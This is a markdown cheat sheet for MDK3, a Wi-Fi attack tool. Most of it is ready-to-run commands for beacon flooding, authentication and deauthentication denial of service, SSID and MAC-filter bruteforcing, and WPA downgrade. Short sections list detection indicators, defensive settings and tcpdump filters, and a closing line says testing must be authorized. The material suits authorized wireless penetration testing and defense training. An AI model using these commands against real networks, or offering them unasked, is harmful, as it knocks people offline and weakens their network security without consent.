# MDK3 Quick Reference

## Installation

```bash
sudo apt install mdk3
```

## Basic Syntax

```bash
mdk3 <interface> <test_mode> [options]
```

## Test Modes

| Mode | Name | Description |
|------|------|-------------|
| `b` | Beacon Flood | Fake APs |
| `a` | Auth DoS | Auth storm |
| `p` | Probing | SSID bruteforce |
| `d` | Deauth Amok | Kick all clients |
| `m` | Michael | TKIP DoS |
| `x` | 802.1X | Port auth test |
| `w` | WIDS | Confuse IDS |
| `f` | MAC Filter | Bruteforce MACs |
| `g` | WPA Downgrade | Force WEP |

## Quick Commands

### Beacon Flood
```bash
mdk3 wlan0 b                              # Basic
mdk3 wlan0 b -n "FreeWiFi" -c 6          # Named
mdk3 wlan0 b -n "Test" -w 1              # WPA fake
```

### Authentication DoS
```bash
mdk3 wlan0 a                              # All APs
mdk3 wlan0 a -c 6                        # Specific channel
mdk3 wlan0 a -i AA:BB:CC:DD:EE:FF       # Specific AP
```

### Deauthentication
```bash
mdk3 wlan0 d                              # All clients
mdk3 wlan0 d -c 6                        # Specific channel
mdk3 wlan0 d -m AA:BB:CC:DD:EE:FF       # Specific client
mdk3 wlan0 d -t AA:BB:CC:DD:EE:FF       # Specific AP
```

### SSID Bruteforce
```bash
mdk3 wlan0 p                              # Probe all
mdk3 wlan0 p -f /usr/share/wordlists/rockyou.txt  # Wordlist
```

### MAC Filter Test
```bash
mdk3 wlan0 f -t AA:BB:CC:DD:EE:FF -b macs.txt
```

### WPA Downgrade
```bash
mdk3 wlan0 g                              # Force WEP
mdk3 wlan0 g -c 6                        # Specific channel
```

## Common Options

```
-c CHANNEL    # Target channel
-m MAC        # Target client MAC
-i MAC        # Target AP MAC
-t MAC        # Target BSSID
-n NAME       # Network name (ESSID)
-f FILE       # Wordlist/MAC list file
-w            # WPA encrypted
-h            # Hidden SSID
-d DELAY      # Delay between packets
```

## Setup Monitor Mode

```bash
airmon-ng start wlan0
# Use wlan0mon interface
mdk3 wlan0mon a
```

## Detection Indicators

- Fake APs appearing
- Deauth packets flooding
- Auth request storms
- Clients disconnecting
- Probe request floods

## Defense Quick Fixes

```bash
# Enable 802.11w (PMF)
# Configure WPA3/SAE
# Enable client isolation
# Deploy WIDS/WIPS
```

## Monitor Commands

```bash
# Watch WiFi traffic
airodump-ng wlan0mon

# Detect deauth
tcpdump -i wlan0mon 'type mgt subtype deauth'

# Detect auth storms
tcpdump -i wlan0mon 'type mgt subtype auth'
```

## System Requirements

- Monitor mode capable adapter
- Root/sudo privileges
- aircrack-ng installed
- Injection-capable driver

## Troubleshooting

| Issue | Solution |
|-------|----------|
| No monitor mode | `airmon-ng start wlan0` |
| Injection fails | `aireplay-ng -9 wlan0` |
| Permission denied | Use `sudo` |
| Wrong interface | Check `iwconfig` |

## Legal Reminder

**Authorized testing only!** MDK3 disrupts WiFi networks. Always obtain written permission before testing.
